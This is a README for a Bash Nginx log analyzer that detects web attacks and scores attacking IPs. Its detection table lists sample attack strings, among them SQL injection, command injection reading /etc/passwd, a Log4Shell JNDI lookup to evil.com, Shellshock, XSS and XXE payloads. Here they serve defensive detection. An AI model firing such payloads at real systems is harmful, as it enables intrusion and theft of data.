# error-counter

Nginx access log analyzer with attack detection.

Parses an Nginx `combined` log file, identifies 15 categories of web attacks,
and produces a security report — with per-IP severity scores.

**One file in, one report out.** No database, no agent, no service.

---

## Features

- **15 attack categories** — SQLi, XSS, Path Traversal, SSRF, Log4Shell,
  Shellshock, RFI, XXE, NoSQL, SSTI, Command Injection, CRLF, Open Redirect,
  Scanner UAs, Sensitive file probes
- **Per-IP scoring** — attacks weighted by severity; IPs ranked by threat
- **IPv4 + IPv6** — both parsed and analyzed
- **Apache compatible** — accepts `-` for zero-byte responses (304/204/HEAD)
- **Basic Auth aware** — captures `$remote_user` (reserved for future use)
- **No dependencies** — pure Bash, no Python/Node/Go
- **Exit codes for CI** — 0 (clean), 1 (usage error), 2 (threats found)
- **Fast** — ~1.6 ms/line on 1M-line logs (see [Performance](#performance))

---

## Supported Log Format

**One format only:** Nginx's default `combined` log format:

```nginx
log_format combined '$remote_addr - $remote_user [$time_local] '
                    '"$request" $status $body_bytes_sent '
                    '"$http_referer" "$http_user_agent"';
```

Example line:

```
192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] "GET /index.html HTTP/1.1" 200 2326 "-" "Mozilla/5.0"
```

### Supported components

| Component    | Notes                                          |
| ------------ | ---------------------------------------------- |
| IPv4 address | `$remote_addr`                                 |
| IPv6 address | `$remote_addr` — full, compressed, IPv4-mapped |
| ident        | Usually `-`, but any token accepted            |
| authuser     | `-` or actual username (Basic Auth)            |
| Timestamp    | `[dd/Mon/yyyy:HH:MM:SS ±zzzz]`                 |
| Request      | `"METHOD PATH HTTP/x.y"`                       |
| Status       | 3-digit HTTP code                              |
| Size         | Number OR `-` (Apache zero-byte responses)     |
| Referer      | `"-"` or URL (not analyzed in v1)              |
| User-Agent   | `"-"` or full UA string                        |

### NOT supported

- Apache `LogFormat` variants (customized per distro)
- Common Log Format (no referer/user-agent)
- W3C Extended (IIS)
- JSON (Caddy, Nginx `escape=json`)

If your log format is different, the tool will report `[WARN] N line(s) skipped`
and treat the log as clean. **Do not rely on this to prove the log is safe** —
check that `Analyzed + Skipped + Empty = Lines` in the report header.

---

## Requirements

- **Bash 4.4 or newer** (for `local -n` nameref and `set -u` array safety)
- **GNU coreutils** (standard on Linux)
- **awk** (standard on Linux, macOS)
- **No other dependencies**

Check your Bash version:

```bash
bash --version | head -1
```

---

## Installation

### From source (recommended)

```bash
git clone https://github.com/MohammadRezaMehrabi/error-counter.git
cd error-counter
sudo ./install.sh
```

Installs to:

- `/usr/local/bin/error-counter` — main script
- `/usr/local/lib/error-counter/` — libraries
- `/usr/local/etc/error-counter/` — config files

### Custom prefix

```bash
sudo PREFIX=/opt/error-counter ./install.sh
```

### Uninstall

```bash
sudo ./install.sh --uninstall
```

### Run without install

```bash
./bin/error_counter.sh /var/log/nginx/access.log
```

---

## Usage

```bash
error-counter <log_file> [OPTIONS]
```

### Options

| Option    | Description                                 | Default |
| --------- | ------------------------------------------- | ------- |
| `-o FILE` | Save report to file (in addition to stdout) | —       |
| `-s N`    | Suspicious score threshold                  | 10      |
| `-c N`    | Critical score threshold                    | 30      |
| `-h`      | Show help                                   | —       |
| `-V`      | Show version                                | —       |

### Examples

```bash
# Basic analysis
error-counter /var/log/nginx/access.log

# Save report
error-counter /var/log/nginx/access.log -o report.txt

# Custom thresholds
error-counter access.log -s 15 -c 50

# In a script
error-counter access.log > /dev/null
case $? in
    0) echo "Clean" ;;
    1) echo "Usage error" >&2 ;;
    2) echo "Threats detected!" >&2; send_alert ;;
esac
```

---

## Exit Codes

| Code  | Meaning                                      | CI Action              |
| ----- | -------------------------------------------- | ---------------------- |
| **0** | No threats detected                          | pass                   |
| **1** | Usage error / invalid input / missing config | fail (script broken)   |
| **2** | Threats detected                             | fail (action required) |

Differentiates "tool is broken" from "log has attacks" — critical for CI.

---

## What It Detects

| Category          | Severity | Weight | Example Trigger                   |
| ----------------- | -------- | ------ | --------------------------------- |
| SQL Injection     | CRITICAL | 10     | `?id=1' OR '1'='1`                |
| Command Injection | CRITICAL | 10     | `?x=;cat /etc/passwd`             |
| RFI               | CRITICAL | 10     | `?file=php://input`               |
| Log4Shell         | CRITICAL | 10     | `${jndi:ldap://evil.com/x}`       |
| Shellshock        | CRITICAL | 10     | `() { :; };` in UA                |
| XSS               | HIGH     | 7      | `<script>alert(1)</script>`       |
| Path Traversal    | HIGH     | 7      | `../../../etc/passwd`             |
| SSRF              | HIGH     | 7      | `?url=http://127.0.0.1/`          |
| XXE               | HIGH     | 7      | `<!ENTITY x SYSTEM "file://...">` |
| NoSQL Injection   | HIGH     | 7      | `?user[$ne]=null`                 |
| SSTI              | HIGH     | 7      | `?name={{7*7}}`                   |
| Sensitive Files   | MEDIUM   | 4      | `/.env`, `/.git/config`           |
| CRLF Injection    | MEDIUM   | 4      | `%0d%0aSet-Cookie:...`            |
| Open Redirect     | LOW      | 2      | `?url=//evil.com`                 |
| Scanner UA        | INFO     | 1      | `sqlmap/1.7`, `Nikto/2.1`         |

Case-insensitive, URL-decoded before matching.

---

## Sample Output

```
╔═══════════════════════════════════════════════════════════╗
║           ERROR COUNTER — LOG ANALYSIS REPORT             ║
╚═══════════════════════════════════════════════════════════╝

  File:        /var/log/nginx/access.log
  Lines:       10000
  Analyzed:    9895
  Skipped:     105
  Empty:       0
  Generated:   2026-10-30 03:55:07

═══════════════════ OVERVIEW ═══════════════════

  Total requests:           9895
  Unique IPs:               6907
  Unique endpoints:         69
  Unique statuses:          10
  Unique methods:           2
  Unique user agents:       19

═══════════════════ SECURITY ANALYSIS ═══════════════════

  Total attacks:            3440
  Attacking IPs:            12

  ATTACK TYPE               COUNT      SEVERITY
 ────────────────────────────────────────────────────
  SQL Injection             433        (CRITICAL)
  Log4Shell                 122        (CRITICAL)
  XSS                       299        (HIGH)

═══════════════════  CRITICAL THREATS ═══════════════════

  IP                                       SCORE    ATTACK TYPES
  ────────────────────────────────────────────────────
  45.155.141.1                             4844     sqli,scanner
  45.5.8.3                                 2107     traversal
```

---

## Configuration

Two config files in `/usr/local/etc/error-counter/` (or `config/` in the repo):

### `thresholds.conf`

```bash
SUSPICIOUS_SCORE_THRESHOLD=10
CRITICAL_SCORE_THRESHOLD=30
TOP_ENDPOINTS=10
```

CLI flags `-s` and `-c` override these values.

### `patterns.conf`

POSIX Extended Regular Expressions, organized by category with severity
weights in `CATEGORY_SEVERITY`. Add a pattern to an existing category:

```bash
SQLI_PATTERNS+=(
    "my_new_sqli_pattern"
)
```

To add a new category, see `docs/usage.md`.

---

## Performance

Measured on 4-core Linux, bash 5.2, 7.7 GB RAM.

| Log size     | Time               | Rate            | Memory      |
| ------------ | ------------------ | --------------- | ----------- |
| 10K lines    | ~18s               | 1.8 ms/line     | ~6 MB       |
| 100K lines   | 188s               | 1.9 ms/line     | ~30 MB      |
| **1M lines** | **1570s (26 min)** | **1.6 ms/line** | **~500 MB** |

**Sublinear scaling** — larger logs process faster per-line due to
bash regex engine JIT warmup and cache effects.

For logs > 1M lines: use `logrotate` to split daily logs before analysis,
or wait for v2 (awk rewrite, expected 10-20× faster).

### Tuning for speed

1. Remove unused categories from `patterns.conf` (~5-10% each)
2. Higher thresholds reduce report size but not processing time
3. Analyze one file at a time — no directory scanning

---

## Limitations (v1.0.0)

- **Single format:** Nginx `combined` only
- **No aggregation:** 1M identical SQLi from one IP = 1M counted
- **No outcome tracking:** 200 (success) vs 403 (blocked) not distinguished
- **Referer not analyzed:** only path and User-Agent checked
- **No double-decode:** `%2527` (double-encoded `'`) not detected
- **Single-file:** no directory, no rotation, no incremental

All planned for v2.

---

## Development

### From source

```bash
git clone https://github.com/MohammadRezaMehrabi/error-counter.git
cd error-counter
./bin/error_counter.sh /path/to/access.log

# Syntax check all files
for f in bin/error_counter.sh lib/*.sh; do
    bash -n "$f" || echo "FAIL: $f"
done

# Shellcheck (optional)
shellcheck bin/error_counter.sh lib/*.sh
```

### Project structure

```
error-counter/
├── bin/error_counter.sh     # Main entry point
├── lib/
│   ├── colors.sh            # ANSI colors
│   ├── logging.sh           # log_info / log_warn / log_error
│   ├── validators.sh        # is_ipv4, is_ipv6, is_http_status
│   ├── parser.sh            # Parse one Nginx combined line
│   ├── analyzer.sh          # Aggregate counts (status, IP, path, UA)
│   ├── security.sh          # Attack detection
│   └── reporter.sh          # Generate the text report
├── config/
│   ├── patterns.conf        # Attack regexes + severity weights
│   └── thresholds.conf      # Suspicious/critical thresholds
├── docs/
│   ├── usage.md             # Detailed usage guide
│   └── examples.md          # Attack examples with explanations
├── tests/
│   └── fixtures/
│       └── access.log       # Sample log for manual testing
├── install.sh               # Installer
├── Makefile                 # Build/test/install targets
├── CHANGELOG.md             # Release history
├── LICENSE                  # MIT
└── README.md
```

### Testing

```bash
make check    # syntax check
make test     # smoke tests
make lint     # shellcheck
```

---

## Contributing

1. Fork the repo
2. Create a feature branch (`git checkout -b feature/my-change`)
3. Commit your changes (`git commit -am 'Add my change'`)
4. Push to the branch (`git push origin feature/my-change`)
5. Open a Pull Request

**Requirements:**

- Bash 4.4+ (tested on 5.0, 5.1, 5.2)
- All code must run `bash -n` cleanly
- New patterns must include a test case in `docs/examples.md`
- Update `CHANGELOG.md` under `## [Unreleased]`

---

## Security

To report a vulnerability in error-counter itself (not in the logs it
analyzes), email the maintainer directly rather than opening a public issue.

---

## Author

**MohammadReza Mehrabi**

- GitHub: [@MohammadRezaMehrabi](https://github.com/MohammadRezaMehrabi)
- Email: mhraby525@gmail.com

---

## License

MIT — see [LICENSE](LICENSE) for details.
